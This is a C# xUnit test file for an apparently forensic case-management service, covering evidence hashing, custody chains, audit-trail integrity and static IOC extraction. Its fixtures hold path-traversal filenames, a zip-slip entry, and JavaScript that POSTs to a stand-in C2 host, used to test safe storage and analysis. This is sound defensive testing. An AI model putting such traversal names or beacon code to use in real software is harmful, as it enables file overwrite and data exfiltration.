using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.IO.Compression;
using AtlasForense.Models;
using AtlasForense.Services;
using AtlasForense.Forensics;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.FileProviders;
using Xunit;

namespace AtlasForense.Tests;

public sealed class ForensicCaseServiceTests : IDisposable
{
    private readonly string _root = Path.Combine(Path.GetTempPath(), $"atlas-forense-tests-{Guid.NewGuid():N}");
    private readonly JsonForensicCaseService _service;

    public ForensicCaseServiceTests()
    {
        Directory.CreateDirectory(_root);
        _service = new JsonForensicCaseService(new TestEnvironment(_root), [new StaticTextAnalyzer()]);
    }

    [Fact]
    public async Task CompleteWorkflow_EnforcesFourStagesAndSealsCase()
    {
        var item = await CreateCase();
        var authorization = await Authorize(item.Id);
        var acquisition = await Acquire(item.Id, "evidence.bin", "known forensic payload");
        var analysis = await _service.StartAnalysisAsync(item.Id, "Analyst A", default);
        var finding = await AddFinding(item.Id);
        var report = await PrepareReport(item.Id);
        var review = await _service.ReviewReportAsync(item.Id, "Supervisor", true, "Validated", default);
        var close = await _service.CloseAsync(item.Id, "Supervisor", default);

        Assert.All(new[] { authorization, acquisition, analysis, finding, report, review, close }, result => Assert.True(result.Success, result.Message));
        var completed = Assert.IsType<ForensicCase>(_service.Get(item.Id));
        Assert.Equal(CaseStatus.Closed, completed.Status);
        Assert.All(completed.Evidence, evidence => Assert.Equal(EvidenceStatus.Sealed, evidence.Status));
        Assert.False(string.IsNullOrWhiteSpace(completed.Report?.IntegrityHash));
    }

    [Fact]
    public async Task Report_RequiresIndependentApprovalBeforeClosure()
    {
        var item = await CreateCase(); await Authorize(item.Id); await Acquire(item.Id, "evidence.bin", "known");
        await _service.StartAnalysisAsync(item.Id, "Analyst A", default); await AddFinding(item.Id); await PrepareReport(item.Id);

        Assert.False((await _service.CloseAsync(item.Id, "Supervisor", default)).Success);
        Assert.False((await _service.ReviewReportAsync(item.Id, "Analyst A", true, "Self review", default)).Success);
        Assert.True((await _service.ReviewReportAsync(item.Id, "Supervisor", true, "Independent review", default)).Success);
        Assert.True((await _service.CloseAsync(item.Id, "Custodian", default)).Success);
        Assert.Contains(item.AuditTrail, x => x.Action == "REPORT_APPROVED");
    }

    [Fact]
    public async Task RejectedReport_ReturnsCaseToAnalysis()
    {
        var item = await CreateCase(); await Authorize(item.Id); await Acquire(item.Id, "evidence.bin", "known");
        await _service.StartAnalysisAsync(item.Id, "Analyst A", default); await AddFinding(item.Id); await PrepareReport(item.Id);

        var result = await _service.ReviewReportAsync(item.Id, "Reviewer B", false, "Clarify timeline", default);

        Assert.True(result.Success);
        Assert.Equal(CaseStatus.Analyzing, item.Status);
        Assert.False(item.ReportReview!.Approved);
        Assert.False((await _service.CloseAsync(item.Id, "Supervisor", default)).Success);
    }

    [Fact]
    public async Task StageGates_RejectIncompleteOrOutOfOrderOperations()
    {
        var item = await CreateCase();
        Assert.False((await _service.StartAnalysisAsync(item.Id, "Analyst", default)).Success);
        Assert.False((await _service.CloseAsync(item.Id, "Supervisor", default)).Success);

        Assert.True((await Authorize(item.Id)).Success);
        Assert.False((await _service.StartAnalysisAsync(item.Id, "Analyst", default)).Success);

        Assert.True((await Acquire(item.Id, "disk.img", "payload")).Success);
        Assert.True((await _service.StartAnalysisAsync(item.Id, "Analyst", default)).Success);
        Assert.False((await PrepareReport(item.Id)).Success);
        Assert.False((await _service.CloseAsync(item.Id, "Supervisor", default)).Success);
    }

    [Fact]
    public async Task Acquisition_ComputesExpectedSha256AndPreservesExactBytes()
    {
        var bytes = Encoding.UTF8.GetBytes("NIST-known-test-vector-AtlasForense");
        var expected = Convert.ToHexString(SHA256.HashData(bytes)).ToLowerInvariant();
        var item = await CreateCase();
        await Authorize(item.Id);

        var result = await Acquire(item.Id, "source.dd", bytes);

        Assert.True(result.Success, result.Message);
        var evidence = Assert.Single(_service.Get(item.Id)!.Evidence);
        Assert.Equal(expected, evidence.Sha256);
        var storedPath = Path.Combine(_root, "App_Data", "Evidence", item.Id.ToString("N"), evidence.StoredFileName);
        Assert.Equal(bytes, await File.ReadAllBytesAsync(storedPath));
    }

    [Fact]
    public async Task Acquisition_StoresHostileFilenameOutsideWebRoot()
    {
        var item = await CreateCase();
        await Authorize(item.Id);

        var result = await Acquire(item.Id, "../../wwwroot/attack.aspx", "not executable here");

        Assert.True(result.Success, result.Message);
        var evidence = Assert.Single(_service.Get(item.Id)!.Evidence);
        Assert.DoesNotContain("..", evidence.StoredFileName);
        Assert.DoesNotContain('/', evidence.StoredFileName);
        Assert.Empty(Directory.EnumerateFiles(Path.Combine(_root, "wwwroot"), "*", SearchOption.AllDirectories));
        Assert.Single(Directory.EnumerateFiles(Path.Combine(_root, "App_Data", "Evidence"), "*", SearchOption.AllDirectories));
    }

    [Fact]
    public async Task ChainOfCustodyAndAuditTrail_AreOrderedAndHashLinked()
    {
        var item = await CreateCase();
        await Authorize(item.Id);
        await Acquire(item.Id, "memory.raw", "volatile data");
        var evidence = Assert.Single(_service.Get(item.Id)!.Evidence);

        var custody = await _service.AddCustodyAsync(new CustodyInput { CaseId = item.Id, EvidenceId = evidence.Id, Action = "Transferencia a bóveda", PerformedBy = "Custodian", Location = "Vault A", Notes = "Sello intacto" }, default);

        Assert.True(custody.Success, custody.Message);
        Assert.Equal(2, evidence.ChainOfCustody.Count);
        var audit = _service.Get(item.Id)!.AuditTrail;
        Assert.Equal(Enumerable.Range(1, audit.Count).Select(x => (long)x), audit.Select(x => x.Sequence));
        Assert.Equal("GENESIS", audit[0].PreviousHash);
        for (var index = 1; index < audit.Count; index++) Assert.Equal(audit[index - 1].EntryHash, audit[index].PreviousHash);
        Assert.Equal(audit.Count, audit.Select(x => x.EntryHash).Distinct().Count());
    }

    [Fact]
    public async Task Persistence_ReloadsCaseWithoutChangingEvidenceHashOrAudit()
    {
        var item = await CreateCase();
        await Authorize(item.Id);
        await Acquire(item.Id, "log.evtx", "event log bytes");
        var before = _service.Get(item.Id)!;

        var reloaded = new JsonForensicCaseService(new TestEnvironment(_root)).Get(item.Id);

        Assert.NotNull(reloaded);
        Assert.Equal(before.Evidence.Single().Sha256, reloaded!.Evidence.Single().Sha256);
        Assert.Equal(before.AuditTrail.Select(x => x.EntryHash), reloaded.AuditTrail.Select(x => x.EntryHash));
    }

    [Fact]
    public async Task ConcurrentCaseCreation_ProducesUniqueFoliosAndValidFiles()
    {
        var tasks = Enumerable.Range(1, 20).Select(index => _service.CreateAsync(new CreateCaseInput { Title = $"Case {index}", RequestingOrganization = "Lab", LeadExaminer = "Examiner", Scope = "Controlled concurrency test" }, default));
        var created = await Task.WhenAll(tasks);

        Assert.Equal(20, created.Select(x => x.Folio).Distinct().Count());
        var database = new FileInfo(Path.Combine(_root, "App_Data", "atlas-forense.db"));
        Assert.True(database.Exists);
        Assert.True(database.Length > 0);
        Assert.Equal(20, _service.GetAll().Count);
    }

    [Fact]
    public async Task Acquisition_RejectsEmptyEvidenceFile()
    {
        var item = await CreateCase();
        await Authorize(item.Id);
        var result = await Acquire(item.Id, "empty.bin", Array.Empty<byte>());
        Assert.False(result.Success);
        Assert.Empty(_service.Get(item.Id)!.Evidence);
    }

    [Fact]
    public async Task StaticAnalysis_ExtractsIocsFunctionsAndCapabilitiesWithoutExecutingSample()
    {
        var script = "async function sendData(){ return fetch('https://c2.example.test/request/auth.php', {method:'POST'}); } localStorage.setItem('domain','c2.example.test');";
        var item = await CreateCase();
        await Authorize(item.Id);
        await Acquire(item.Id, "sample.js", script);
        await _service.StartAnalysisAsync(item.Id, "Analyst", default);
        var evidence = item.Evidence.Single();

        var result = await _service.AnalyzeEvidenceAsync(item.Id, evidence.Id, "Analyst", default);

        Assert.True(result.Success, result.Message);
        var analyzed = _service.Get(item.Id)!;
        var run = Assert.Single(analyzed.AnalysisRuns);
        Assert.True(run.NetworkBlocked);
        Assert.False(run.SampleExecuted);
        Assert.Contains(analyzed.Indicators, x => x.Type == IndicatorType.Url && x.Value.Contains("c2.example.test"));
        Assert.Contains(analyzed.Indicators, x => x.Type == IndicatorType.Domain && x.Value == "c2.example.test");
        Assert.Contains(analyzed.Artifacts, x => x.Kind == ArtifactKind.ScriptFunction && x.Value == "sendData");
        Assert.Contains(analyzed.Artifacts, x => x.Kind == ArtifactKind.Capability && x.Value == "Network request");
        Assert.Contains(analyzed.Artifacts, x => x.Kind == ArtifactKind.Capability && x.Value == "Browser storage");
    }

    [Fact]
    public async Task StaticAnalysis_BlocksTamperedEvidenceAndAuditsIntegrityFailure()
    {
        var item = await CreateCase();
        await Authorize(item.Id);
        await Acquire(item.Id, "sample.js", "function clean() { return true; }");
        await _service.StartAnalysisAsync(item.Id, "Analyst", default);
        var evidence = item.Evidence.Single();
        var path = Path.Combine(_root, "App_Data", "Evidence", item.Id.ToString("N"), evidence.StoredFileName);
        await File.AppendAllTextAsync(path, "tampered");

        var result = await _service.AnalyzeEvidenceAsync(item.Id, evidence.Id, "Analyst", default);

        Assert.False(result.Success);
        Assert.Empty(item.AnalysisRuns);
        Assert.Contains(item.AuditTrail, x => x.Action == "INTEGRITY_FAILURE");
    }

    [Fact]
    public async Task StaticAnalysis_UnwrapsEncodedIocAndPreservesEveryLayer()
    {
        var encoded = Convert.ToBase64String(Encoding.UTF8.GetBytes("https://hidden.example.test/gate.php"));
        var item = await CreateCase();
        await Authorize(item.Id);
        await Acquire(item.Id, "encoded.js", $"const endpoint = '{encoded}';");
        await _service.StartAnalysisAsync(item.Id, "Analyst", default);

        var result = await _service.AnalyzeEvidenceAsync(item.Id, item.Evidence.Single().Id, "Analyst", default);

        Assert.True(result.Success, result.Message);
        Assert.Contains(item.Artifacts, x => x.Kind == ArtifactKind.DecodedContent && x.Value.Contains("hidden.example.test"));
        Assert.Contains(item.Indicators, x => x.Type == IndicatorType.Url && x.Value == "https://hidden.example.test/gate.php");
    }

    [Fact]
    public async Task MarkdownReport_ContainsEvidenceAnalysisFindingsAndVerifiableManifest()
    {
        var item = await CreateCase();
        await Authorize(item.Id);
        await Acquire(item.Id, "sample.js", "function beacon(){ fetch('https://evidence.example.test/api'); }");
        await _service.StartAnalysisAsync(item.Id, "Analyst", default);
        await _service.AnalyzeEvidenceAsync(item.Id, item.Evidence.Single().Id, "Analyst", default);
        await AddFinding(item.Id);
        await PrepareReport(item.Id);

        var document = new MarkdownForensicReportBuilder().BuildMarkdown(item);

        Assert.EndsWith("-informe-forense.md", document.FileName);
        Assert.Equal(64, document.Sha256.Length);
        Assert.Contains("## 4. Inventario y preservación de evidencia", document.Content);
        Assert.Contains(item.Evidence.Single().Sha256, document.Content);
        Assert.Contains("static-text-ioc", document.Content);
        Assert.Contains("https://evidence.example.test/api", document.Content);
        Assert.Contains("## 7. Hallazgos", document.Content);
        Assert.Contains("Cadena de auditoría: **VÁLIDA**", document.Content);
    }

    [Fact]
    public async Task BackupRestore_ReplacesDisposableDatabaseAndVerifiesIntegrity()
    {
        var original = await CreateCase();
        var backup = await _service.CreateBackupAsync(default);
        Assert.True(backup.Success, backup.Message);
        Assert.Equal(64, backup.Sha256.Length);
        Assert.Equal(1, backup.CaseCount);

        await _service.CreateAsync(new CreateCaseInput { Title = "Disposable", RequestingOrganization = "Lab", LeadExaminer = "Examiner", Scope = "Restore test" }, default);
        Assert.Equal(2, _service.GetAll().Count);

        var restored = await _service.RestoreBackupAsync(backup.FileName, default);

        Assert.True(restored.Success, restored.Message);
        Assert.Equal(1, restored.CaseCount);
        Assert.NotNull(_service.Get(original.Id));
        Assert.True((await _service.VerifyAsync(default)).Success);
    }

    [Fact]
    public async Task IntegrityVerification_DetectsModifiedAuditMetadata()
    {
        var item = await CreateCase();
        item.AuditTrail.Single().Detail = "modified";

        var result = await _service.VerifyAsync(default);

        Assert.False(result.Success);
        Assert.Contains("auditoría inválida", result.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task IntegrityVerification_DetectsDeletedTailAuditEntry()
    {
        var item = await CreateCase();
        item.AuditTrail.Clear();

        var result = await _service.VerifyAsync(default);

        Assert.False(result.Success);
        Assert.Contains("control de auditoría", result.Message, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task Startup_ImportsLegacyJsonWithoutDeletingIt()
    {
        var importRoot = Path.Combine(Path.GetTempPath(), $"atlas-forense-import-{Guid.NewGuid():N}");
        Directory.CreateDirectory(Path.Combine(importRoot, "App_Data"));
        try
        {
            var legacy = new ForensicCase { Folio = "AF-2025-00001", Title = "Legacy", RequestingOrganization = "Lab", LeadExaminer = "Examiner", Scope = "Preserve" };
            var legacyPath = Path.Combine(importRoot, "App_Data", "cases.json");
            await File.WriteAllTextAsync(legacyPath, JsonSerializer.Serialize(new[] { legacy }, new JsonSerializerOptions(JsonSerializerDefaults.Web)));

            var imported = new JsonForensicCaseService(new TestEnvironment(importRoot));

            Assert.NotNull(imported.Get(legacy.Id));
            Assert.True(File.Exists(legacyPath));
            Assert.True(File.Exists(Path.Combine(importRoot, "App_Data", "atlas-forense.db")));
        }
        finally
        {
            if (Directory.Exists(importRoot)) Directory.Delete(importRoot, true);
        }
    }

    [Fact]
    public async Task CaseAssignments_ArePerCaseAndRejectExaminerSelfPromotionToReviewer()
    {
        var examinerId = Guid.NewGuid();
        var item = await _service.CreateAsync(new CreateCaseInput
        {
            Title = "Assigned case", RequestingOrganization = "Lab", LeadExaminer = "Examiner", Scope = "Assignment test", ActorUserId = examinerId
        }, default);
        var reviewerId = Guid.NewGuid();

        var reviewer = await _service.AssignUserAsync(new CaseAssignmentInput { CaseId = item.Id, UserId = reviewerId, Role = ForensicRole.Reviewer }, Guid.NewGuid(), "Administrator", default);
        var conflict = await _service.AssignUserAsync(new CaseAssignmentInput { CaseId = item.Id, UserId = examinerId, Role = ForensicRole.Reviewer }, Guid.NewGuid(), "Administrator", default);

        Assert.True(reviewer.Success, reviewer.Message);
        Assert.False(conflict.Success);
        Assert.Contains(item.Assignments, assignment => assignment.UserId == examinerId && assignment.Role == ForensicRole.Examiner && assignment.Active);
        Assert.Contains(item.Assignments, assignment => assignment.UserId == reviewerId && assignment.Role == ForensicRole.Reviewer && assignment.Active);
    }

    [Fact]
    public async Task Reopening_PreservesClosedReportAndCreatesNextImmutableVersion()
    {
        var item = await CreateCase();
        await Authorize(item.Id); await Acquire(item.Id, "evidence.txt", "evidence"); await _service.StartAnalysisAsync(item.Id, "Examiner", default);
        await AddFinding(item.Id); await PrepareReport(item.Id); await _service.ReviewReportAsync(item.Id, "Reviewer", true, "Approved", default); await _service.CloseAsync(item.Id, "Reviewer", default);
        var firstHash = item.Report!.IntegrityHash;
        Assert.Equal(1, item.Report.Version);
        Assert.Equal(firstHash, item.Closures.Single().ApprovedReportHash);

        var reopened = await _service.ReopenAsync(item.Id, "Administrator", "Additional authorized evidence", default);
        await PrepareReport(item.Id);

        Assert.True(reopened.Success, reopened.Message);
        Assert.Equal(2, item.Report!.Version);
        Assert.Equal(2, item.ReportVersions.Count);
        Assert.Equal(firstHash, item.ReportVersions[0].IntegrityHash);
        Assert.NotNull(item.Closures[0].ReopenedAtUtc);
        Assert.Equal("Additional authorized evidence", item.Closures[0].ReopenReason);
    }

    [Fact]
    public async Task Acquisition_DetectsSignatureWithoutTrustingExtensionAndRecordsDuplicates()
    {
        var item = await CreateCase(); await Authorize(item.Id);
        var pdf = "%PDF-1.7\nknown"u8.ToArray();
        Assert.True((await Acquire(item.Id, "not-a-pdf.txt", pdf)).Success);
        Assert.True((await Acquire(item.Id, "second-name.bin", pdf)).Success);

        Assert.All(item.Evidence, evidence => { Assert.Equal("PDF", evidence.DetectedFileType); Assert.Equal("application/pdf", evidence.DetectedMimeType); Assert.DoesNotContain('.', evidence.StoredFileName); });
        Assert.Null(item.Evidence[0].DuplicateOfEvidenceId);
        Assert.Equal(item.Evidence[0].Id, item.Evidence[1].DuplicateOfEvidenceId);
    }

    [Fact]
    public async Task Acquisition_BlocksUnsafeArchiveAndCleansTemporaryFiles()
    {
        var item = await CreateCase(); await Authorize(item.Id);
        byte[] content;
        using (var output = new MemoryStream())
        {
            using (var archive = new ZipArchive(output, ZipArchiveMode.Create, leaveOpen: true))
            using (var writer = new StreamWriter(archive.CreateEntry("../escape.txt").Open())) writer.Write("unsafe");
            content = output.ToArray();
        }

        var result = await Acquire(item.Id, "evidence.zip", content);

        Assert.False(result.Success);
        Assert.Empty(item.Evidence);
        Assert.Empty(Directory.EnumerateFiles(Path.Combine(_root, "App_Data", "Evidence"), "*", SearchOption.AllDirectories));
    }

    [Fact]
    public async Task Acquisition_RejectsTruncatedStreamAndRemovesPartialFile()
    {
        var item = await CreateCase(); await Authorize(item.Id);
        var stream = new ThrowingReadStream(Encoding.UTF8.GetBytes("partial forensic payload"), 8);
        var file = new FormFile(stream, 0, 24, "File", "truncated.bin");

        var result = await _service.AcquireAsync(AcquisitionInput(item.Id, file), default);

        Assert.False(result.Success);
        Assert.Empty(item.Evidence);
        Assert.Empty(Directory.EnumerateFiles(Path.Combine(_root, "App_Data", "Evidence"), "*", SearchOption.AllDirectories));
    }

    [Fact]
    public async Task Acquisition_CancellationLeavesNoEvidenceOrTemporaryFile()
    {
        var item = await CreateCase(); await Authorize(item.Id);
        using var cancellation = new CancellationTokenSource();
        cancellation.Cancel();
        var content = Encoding.UTF8.GetBytes("cancelled payload");
        var file = new FormFile(new MemoryStream(content), 0, content.Length, "File", "cancelled.bin");

        await Assert.ThrowsAnyAsync<OperationCanceledException>(() => _service.AcquireAsync(AcquisitionInput(item.Id, file), cancellation.Token));

        Assert.Empty(item.Evidence);
        var evidenceRoot = Path.Combine(_root, "App_Data", "Evidence");
        Assert.Empty(Directory.EnumerateFiles(evidenceRoot, "*", SearchOption.AllDirectories));
    }

    [Fact]
    public async Task ConcurrentAcquisitionsAreSerializedAndPersistDistinctEvidence()
    {
        var item = await CreateCase(); await Authorize(item.Id);
        var acquisitions = Enumerable.Range(1, 4).Select(index => Acquire(item.Id, $"evidence-{index}.bin", $"payload-{index}"));

        var results = await Task.WhenAll(acquisitions);

        Assert.All(results, result => Assert.True(result.Success, result.Message));
        Assert.Equal(4, item.Evidence.Count);
        Assert.Equal(4, item.Evidence.Select(x => x.Identifier).Distinct().Count());
        Assert.Equal(4, item.Evidence.Select(x => x.StoredFileName).Distinct().Count());
        Assert.Equal(4, Directory.EnumerateFiles(Path.Combine(_root, "App_Data", "Evidence"), "*", SearchOption.AllDirectories).Count());
    }

    [Fact]
    public async Task Acquisition_RejectsExpectedHashMismatchAndCleansTemporaryFile()
    {
        var item = await CreateCase(); await Authorize(item.Id);
        var content = Encoding.UTF8.GetBytes("known payload");
        var file = new FormFile(new MemoryStream(content), 0, content.Length, "File", "evidence.bin");
        var input = AcquisitionInput(item.Id, file);
        input.ExpectedSha256 = new string('0', 64);

        var result = await _service.AcquireAsync(input, default);

        Assert.False(result.Success);
        Assert.Empty(item.Evidence);
        Assert.Empty(Directory.EnumerateFiles(Path.Combine(_root, "App_Data", "Evidence"), "*", SearchOption.AllDirectories));
    }

    [Fact]
    public async Task Acquisition_PreservesSeparateItemsWithDuplicateOriginalFilename()
    {
        var item = await CreateCase(); await Authorize(item.Id);

        Assert.True((await Acquire(item.Id, "duplicate.bin", "first payload")).Success);
        Assert.True((await Acquire(item.Id, "duplicate.bin", "second payload")).Success);

        Assert.Equal(2, item.Evidence.Count);
        Assert.All(item.Evidence, evidence => Assert.Equal("duplicate.bin", evidence.OriginalFileName));
        Assert.Equal(2, item.Evidence.Select(evidence => evidence.StoredFileName).Distinct().Count());
    }

    private Task<ForensicCase> CreateCase() => _service.CreateAsync(new CreateCaseInput { Title = "Validated case", RequestingOrganization = "Forensic Lab", LeadExaminer = "Examiner A", Scope = "Known test data only" }, default);
    private Task<OperationResult> Authorize(Guid id) => _service.AuthorizeAsync(new AuthorizeCaseInput { CaseId = id, Authority = "Test authority", Reference = "AUTH-001", ApprovedBy = "Supervisor", Limitations = "Laboratory validation" }, default);
    private Task<OperationResult> Acquire(Guid id, string name, string content) => Acquire(id, name, Encoding.UTF8.GetBytes(content));
    private Task<OperationResult> Acquire(Guid id, string name, byte[] content)
    {
        var stream = new MemoryStream(content);
        var file = new FormFile(stream, 0, content.Length, "File", name);
        return _service.AcquireAsync(AcquisitionInput(id, file), default);
    }
    private static AcquireEvidenceInput AcquisitionInput(Guid id, IFormFile file) => new()
    {
        CaseId = id, Description = "Known evidence", SourceType = "Test fixture", SourceLocation = "Isolated lab",
        AcquiredBy = "Examiner A", AcquisitionMethod = "Controlled byte copy", ToolName = "Atlas test fixture",
        ToolVersion = "1.0", SourceDeviceIdentifier = "fixture-001", File = file
    };
    private Task<OperationResult> AddFinding(Guid id) => _service.AddFindingAsync(new FindingInput { CaseId = id, Title = "Known indicator", Severity = FindingSeverity.High, Description = "Expected finding", TechnicalDetails = "Matched controlled fixture", EvidenceReferences = $"{_service.Get(id)!.Evidence.Single().Identifier}", Analyst = "Analyst A" }, default);
    private Task<OperationResult> PrepareReport(Guid id) => _service.PrepareReportAsync(new ReportInput { CaseId = id, ExecutiveSummary = "Controlled result", Methodology = "Known input compared with expected output", Conclusions = "Integrity preserved", Recommendations = "Retain validation record", PreparedBy = "Analyst A" }, default);

    public void Dispose()
    {
        if (Directory.Exists(_root)) Directory.Delete(_root, true);
    }

    private sealed class TestEnvironment : IWebHostEnvironment
    {
        public TestEnvironment(string root)
        {
            ContentRootPath = root;
            WebRootPath = Path.Combine(root, "wwwroot");
            Directory.CreateDirectory(WebRootPath);
            ContentRootFileProvider = new PhysicalFileProvider(ContentRootPath);
            WebRootFileProvider = new PhysicalFileProvider(WebRootPath);
        }
        public string ApplicationName { get; set; } = "AtlasForense.Tests";
        public IFileProvider WebRootFileProvider { get; set; }
        public string WebRootPath { get; set; }
        public string EnvironmentName { get; set; } = "Testing";
        public string ContentRootPath { get; set; }
        public IFileProvider ContentRootFileProvider { get; set; }
    }

    private sealed class ThrowingReadStream(byte[] content, int throwAfterBytes) : MemoryStream(content)
    {
        private int _bytesRead;

        public override int Read(byte[] buffer, int offset, int count)
        {
            if (_bytesRead >= throwAfterBytes) throw new IOException("Simulated truncated source.");
            var read = base.Read(buffer, offset, Math.Min(count, throwAfterBytes - _bytesRead));
            _bytesRead += read;
            return read;
        }

        public override ValueTask<int> ReadAsync(Memory<byte> buffer, CancellationToken cancellationToken = default)
        {
            cancellationToken.ThrowIfCancellationRequested();
            if (_bytesRead >= throwAfterBytes) throw new IOException("Simulated truncated source.");
            var read = base.Read(buffer.Span[..Math.Min(buffer.Length, throwAfterBytes - _bytesRead)]);
            _bytesRead += read;
            return ValueTask.FromResult(read);
        }
    }
}
